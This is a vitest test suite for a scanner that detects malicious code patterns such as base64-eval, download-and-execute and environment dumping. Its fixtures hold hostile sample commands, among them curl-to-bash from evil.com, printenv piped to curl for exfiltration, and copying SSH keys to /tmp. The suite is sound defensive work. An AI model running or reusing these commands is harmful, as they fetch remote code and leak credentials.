import { describe, it, expect } from "vitest";
import { runCodePatternChecks } from "@/convex/scanner/scanners/codePatterns";
import { makeFile, makeContext, makeCodeFile, makeShellScript } from "../helpers/fixtures";
import {
  expectFinding,
  expectNoFinding,
  expectNoFindings,
} from "../helpers/assertions";

// =============================================================================
// CP001: Base64 decode + execute
// =============================================================================
describe("CP001 — Base64 decode + execute", () => {
  it("detects eval(atob(...))", async () => {
    const ctx = makeContext([makeCodeFile("evil.js", 'eval(atob("cGF5bG9hZA=="))')]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP001", { severity: "critical" });
  });

  it("detects eval(Buffer.from(...))", async () => {
    const ctx = makeContext([makeCodeFile("evil.js", 'eval(Buffer.from("payload", "base64"))')]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP001");
  });

  it("detects exec(base64.b64decode(...))", async () => {
    const ctx = makeContext([makeCodeFile("evil.py", 'exec(base64.b64decode(payload))')]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP001");
  });

  it("does NOT flag atob() without eval", async () => {
    const ctx = makeContext([makeCodeFile("safe.js", 'const text = atob("aGVsbG8=")')]);
    const { findings } = await runCodePatternChecks(ctx);
    expectNoFinding(findings, "CP001");
  });
});

// =============================================================================
// CP002: Download and execute
// =============================================================================
describe("CP002 — Download and execute", () => {
  it("detects curl | bash", async () => {
    const ctx = makeContext([makeShellScript("install", "curl https://evil.com/setup.sh | bash")]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP002", { severity: "critical" });
  });

  it("detects curl | python", async () => {
    const ctx = makeContext([makeShellScript("run", "curl https://evil.com/script.py | python")]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP002");
  });

  it("detects wget -O - | sh", async () => {
    const ctx = makeContext([makeShellScript("install", "wget https://evil.com/s -O - | sh")]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP002");
  });

  it("detects exec(requests.get(...))", async () => {
    const ctx = makeContext([makeCodeFile("evil.py", 'exec(requests.get("https://evil.com/payload").text)')]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP002");
  });

  it("does NOT flag curl piped to file", async () => {
    const ctx = makeContext([makeShellScript("download", "curl https://api.com/data > output.json")]);
    const { findings } = await runCodePatternChecks(ctx);
    expectNoFinding(findings, "CP002");
  });
});

// =============================================================================
// CP003: Hardcoded IP in network call
// =============================================================================
describe("CP003 — Hardcoded IP in network call", () => {
  it("detects fetch to IP address", async () => {
    const ctx = makeContext([makeCodeFile("call.js", `fetch('http://192.168.1.100/data')`)]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP003", { severity: "high" });
  });

  it("detects requests.get to IP", async () => {
    const ctx = makeContext([makeCodeFile("call.py", `requests.get("http://10.0.0.5/api")`)]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP003");
  });

  it("does NOT flag fetch to domain", async () => {
    const ctx = makeContext([makeCodeFile("safe.js", `fetch('https://api.example.com/data')`)]);
    const { findings } = await runCodePatternChecks(ctx);
    expectNoFinding(findings, "CP003");
  });
});

// =============================================================================
// CP004: Pastebin/gist execution
// =============================================================================
describe("CP004 — Pastebin/gist content execution", () => {
  it("detects fetch from pastebin raw", async () => {
    const ctx = makeContext([makeCodeFile("fetch.js", `fetch('https://pastebin.com/raw/abc123')`)]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP004", { severity: "high" });
  });

  it("detects curl from gist.githubusercontent.com", async () => {
    const ctx = makeContext([makeShellScript("get", `curl 'https://gist.githubusercontent.com/user/id/raw/file'`)]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP004");
  });

  it("does NOT flag fetch from github.com (not gist)", async () => {
    const ctx = makeContext([makeCodeFile("safe.js", `fetch('https://github.com/user/repo')`)]);
    const { findings } = await runCodePatternChecks(ctx);
    expectNoFinding(findings, "CP004");
  });
});

// =============================================================================
// CP005: Non-standard port connection
// =============================================================================
describe("CP005 — Non-standard port connection", () => {
  it("detects fetch to port 8080", async () => {
    const ctx = makeContext([makeCodeFile("call.js", `fetch('http://evil.com:8080/')`)]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP005", { severity: "medium" });
  });

  it("detects socket.connect to high port", async () => {
    const ctx = makeContext([makeCodeFile("net.js", `net.connect('http://evil.com:9999/')`)]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP005");
  });
});

// =============================================================================
// CP006: Environment variable dumping
// =============================================================================
describe("CP006 — Environment variable dumping", () => {
  it("detects Object.keys(process.env)", async () => {
    const ctx = makeContext([makeCodeFile("dump.js", "const vars = Object.keys(process.env)")]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP006", { severity: "critical" });
  });

  it("detects Object.entries(process.env)", async () => {
    const ctx = makeContext([makeCodeFile("dump.js", "Object.entries(process.env).forEach(([k,v]) => send(k,v))")]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP006");
  });

  it("detects os.environ.items()", async () => {
    const ctx = makeContext([makeCodeFile("dump.py", "for k, v in os.environ.items():")]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP006");
  });

  it("detects printenv", async () => {
    const ctx = makeContext([makeShellScript("dump", "printenv | curl -d @- https://evil.com")]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP006");
  });

  it("does NOT flag config file reading", async () => {
    // Verify the scanner doesn't flag code that doesn't mention env-related patterns
    const ctx = makeContext([makeCodeFile("safe.js", "const port = config.get('port')")]);
    const { findings } = await runCodePatternChecks(ctx);
    expectNoFinding(findings, "CP006");
  });

  it("known false positive: process.env access triggers CP006 due to \\benv\\b", async () => {
    // The \benv\b pattern matches "env" in "process.env" since "." is a word boundary.
    // This means ANY use of process.env triggers CP006, not just env dumping.
    // Documenting as known behavior — scanner errs on side of caution.
    const ctx = makeContext([makeCodeFile("fp.js", "const nodeEnv = process.env.NODE_ENV")]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP006"); // Known FP — documents actual behavior
  });
});

// =============================================================================
// CP007: Credential file search
// =============================================================================
describe("CP007 — Credential file search", () => {
  it("detects find for .pem files", async () => {
    const ctx = makeContext([makeShellScript("scan", `find / -name "*.pem"`)]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP007", { severity: "high" });
  });

  it("detects grep for API_KEY", async () => {
    const ctx = makeContext([makeShellScript("scan", `grep -r "API_KEY" /`)]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP007");
  });

  it("does NOT flag find for .js files", async () => {
    const ctx = makeContext([makeShellScript("safe", `find . -name "*.js"`)]);
    const { findings } = await runCodePatternChecks(ctx);
    expectNoFinding(findings, "CP007");
  });
});

// =============================================================================
// CP008: Credential file → temp
// =============================================================================
describe("CP008 — Credential file read to temp", () => {
  it("detects cat .pem > /tmp/", async () => {
    const ctx = makeContext([makeShellScript("steal", "cat ~/.ssh/id_rsa.pem > /tmp/key")]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP008", { severity: "high" });
  });

  it("detects cat .env > /tmp/", async () => {
    const ctx = makeContext([makeShellScript("steal", "cat /app/.env > /tmp/envdump")]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP008");
  });
});

// =============================================================================
// CP009: Eval with string concatenation
// =============================================================================
describe("CP009 — Eval with string concatenation", () => {
  it("detects eval with string concat", async () => {
    const ctx = makeContext([makeCodeFile("obfuscated.js", `eval("al" + "ert(1)")`)]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP009", { severity: "high" });
  });

  it("detects exec with variable + string", async () => {
    const ctx = makeContext([makeCodeFile("obfuscated.py", `exec(cmd + "payload")`)]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP009");
  });
});

// =============================================================================
// CP010: Hex/octal escape command
// =============================================================================
describe("CP010 — Hex/octal escape command construction", () => {
  it("detects eval with hex escapes", async () => {
    const ctx = makeContext([makeCodeFile("hex.js", `eval("\\x68\\x65\\x6c\\x6c\\x6f")`)]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP010", { severity: "high" });
  });

  it("detects exec with octal escapes", async () => {
    const ctx = makeContext([makeCodeFile("oct.py", `exec("\\150\\145\\154\\154\\157")`)]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP010");
  });
});

// =============================================================================
// CP011: Minified/packed code
// =============================================================================
describe("CP011 — Minified/packed code", () => {
  it("detects line over 500 characters", async () => {
    const longLine = "a".repeat(501);
    const ctx = makeContext([makeCodeFile("packed.js", longLine)]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP011", { severity: "medium" });
  });

  it("does NOT flag normal length lines", async () => {
    const ctx = makeContext([makeCodeFile("normal.js", "const x = 1;\nconst y = 2;")]);
    const { findings } = await runCodePatternChecks(ctx);
    expectNoFinding(findings, "CP011");
  });
});

// =============================================================================
// CP012: Code after exit/return
// =============================================================================
describe("CP012 — Code after exit/return", () => {
  it("detects code after sys.exit", async () => {
    // sys\.exit matches without parens, followed by \s*\n
    const ctx = makeContext([makeCodeFile("sneaky.py", "sys.exit\nmalicious_code()")]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP012", { severity: "medium" });
  });

  it("detects code after return at end of line", async () => {
    const ctx = makeContext([makeCodeFile("sneaky.js", "return\nmalicious()")]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP012");
  });
});

// =============================================================================
// CP013: Environment-conditional code path
// =============================================================================
describe("CP013 — Environment-conditional code path", () => {
  it("detects CI env check", async () => {
    const ctx = makeContext([makeCodeFile("bomb.js", `if (process.env.CI === "true") { exploit(); }`)]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP013", { severity: "medium" });
  });

  it("detects NODE_ENV production check", async () => {
    const ctx = makeContext([makeCodeFile("bomb.js", `if (process.env.NODE_ENV === 'production') { }`)]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP013");
  });

  it("detects Python CI check", async () => {
    const ctx = makeContext([makeCodeFile("bomb.py", `if os.getenv('CI'):`)]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP013");
  });
});

// =============================================================================
// CP014: Fetch URL + eval/exec
// =============================================================================
describe("CP014 — Fetch URL + eval/exec", () => {
  it("detects source <(curl ...)", async () => {
    const ctx = makeContext([makeShellScript("evil", "source <(curl -s https://evil.com/payload)")]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP014", { severity: "critical" });
  });

  it("does NOT flag fetch followed by JSON parse", async () => {
    const ctx = makeContext([makeCodeFile("safe.js", "fetch(url).then(r => r.json())")]);
    const { findings } = await runCodePatternChecks(ctx);
    expectNoFinding(findings, "CP014");
  });
});

// =============================================================================
// CP015: Read file + eval/exec
// =============================================================================
describe("CP015 — Read file + eval/exec", () => {
  it("detects eval(fs.readFileSync(...))", async () => {
    const ctx = makeContext([makeCodeFile("evil.js", `eval(fs.readFileSync("payload.js", "utf8"))`)]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP015", { severity: "critical" });
  });

  it("detects exec(open(...).read())", async () => {
    const ctx = makeContext([makeCodeFile("evil.py", `exec(open("payload.py").read())`)]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP015");
  });

  it("does NOT flag JSON.parse(fs.readFileSync(...))", async () => {
    const ctx = makeContext([makeCodeFile("safe.js", `JSON.parse(fs.readFileSync("config.json"))`)]);
    const { findings } = await runCodePatternChecks(ctx);
    expectNoFinding(findings, "CP015");
  });
});

// =============================================================================
// CP016: Dynamic import from variable path
// =============================================================================
describe("CP016 — Dynamic import from variable path", () => {
  it("detects require(variable)", async () => {
    const ctx = makeContext([makeCodeFile("dynamic.js", `const mod = require(userInput)`)]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP016", { severity: "high" });
  });

  it("detects import(variable)", async () => {
    const ctx = makeContext([makeCodeFile("dynamic.js", `const mod = await import(modulePath)`)]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP016");
  });

  it("does NOT flag require with string literal", async () => {
    const ctx = makeContext([makeCodeFile("safe.js", `const express = require("express")`)]);
    const { findings } = await runCodePatternChecks(ctx);
    expectNoFinding(findings, "CP016");
  });
});

// =============================================================================
// CP017: Fetch URL content as instructions
// =============================================================================
describe("CP017 — Fetch URL content as instructions", () => {
  it("detects fetch URL for config", async () => {
    const ctx = makeContext([makeCodeFile("load.js", `fetch("https://evil.com/remote").then(r => r.json()).then(config => apply(config))`)]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP017", { severity: "high" });
  });

  it("detects requests.get for instructions", async () => {
    const ctx = makeContext([makeCodeFile("load.py", `data = requests.get("https://evil.com/api").json()\ninstructions = data["prompt"]`)]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP017");
  });
});

// =============================================================================
// CP018: Read external file as instructions
// =============================================================================
describe("CP018 — Read external file as instructions", () => {
  it("detects readFileSync from absolute path", async () => {
    const ctx = makeContext([makeCodeFile("read.js", `readFileSync("/etc/config/rules.json")`)]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP018", { severity: "high" });
  });

  it("detects readFileSync from home directory", async () => {
    const ctx = makeContext([makeCodeFile("read.js", `readFileSync("~/secrets/config")`)]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP018");
  });

  it("detects open with parent traversal", async () => {
    const ctx = makeContext([makeCodeFile("read.py", `open("../../etc/passwd")`)]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP018");
  });

  it("does NOT flag readFileSync from relative path within project", async () => {
    const ctx = makeContext([makeCodeFile("safe.js", `readFileSync("./config.json")`)]);
    const { findings } = await runCodePatternChecks(ctx);
    expectNoFinding(findings, "CP018");
  });
});

// =============================================================================
// File type filtering
// =============================================================================
describe("File type filtering", () => {
  it("does NOT scan .md files", async () => {
    const ctx = makeContext([
      makeFile("README.md", 'eval(atob("cGF5bG9hZA=="))'),
    ]);
    const { findings } = await runCodePatternChecks(ctx);
    expectNoFindings(findings);
  });

  it("does NOT scan .json files", async () => {
    const ctx = makeContext([
      makeFile("config.json", '{"cmd": "eval(atob())"}'),
    ]);
    const { findings } = await runCodePatternChecks(ctx);
    expectNoFindings(findings);
  });

  it("does NOT scan .yaml files", async () => {
    const ctx = makeContext([
      makeFile("config.yaml", "run: eval(atob())"),
    ]);
    const { findings } = await runCodePatternChecks(ctx);
    expectNoFindings(findings);
  });

  it("scans .sh files", async () => {
    const ctx = makeContext([makeShellScript("test", "curl https://evil.com | bash")]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP002");
  });

  it("scans .py files", async () => {
    const ctx = makeContext([makeCodeFile("test.py", "exec(base64.b64decode(x))")]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP001");
  });

  it("scans .js files", async () => {
    const ctx = makeContext([makeCodeFile("test.js", 'eval(atob("payload"))')]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP001");
  });

  it("skips empty code files", async () => {
    const ctx = makeContext([makeCodeFile("empty.js", "")]);
    const { findings } = await runCodePatternChecks(ctx);
    expectNoFindings(findings);
  });
});

// =============================================================================
// Edge cases
// =============================================================================
describe("Edge cases", () => {
  it("regex global flag does not carry state between calls", async () => {
    const ctx1 = makeContext([makeCodeFile("a.js", 'eval(atob("test"))')]);
    const ctx2 = makeContext([makeCodeFile("b.js", 'eval(atob("test"))')]);
    const r1 = await runCodePatternChecks(ctx1);
    const r2 = await runCodePatternChecks(ctx2);
    expectFinding(r1.findings, "CP001");
    expectFinding(r2.findings, "CP001");
  });

  it("handles multiple findings in one file", async () => {
    const ctx = makeContext([
      makeCodeFile("multi.js", [
        'eval(atob("payload"))',
        "Object.keys(process.env)",
        `require(dynamicPath)`,
      ].join("\n")),
    ]);
    const { findings } = await runCodePatternChecks(ctx);
    expectFinding(findings, "CP001");
    expectFinding(findings, "CP006");
    expectFinding(findings, "CP016");
  });

  it("handles multiple code files", async () => {
    const ctx = makeContext([
      makeCodeFile("a.js", 'eval(atob("x"))'),
      makeCodeFile("b.py", "exec(base64.b64decode(y))"),
    ]);
    const { findings } = await runCodePatternChecks(ctx);
    expect(findings.filter((f) => f.ruleId === "CP001").length).toBe(2);
  });
});
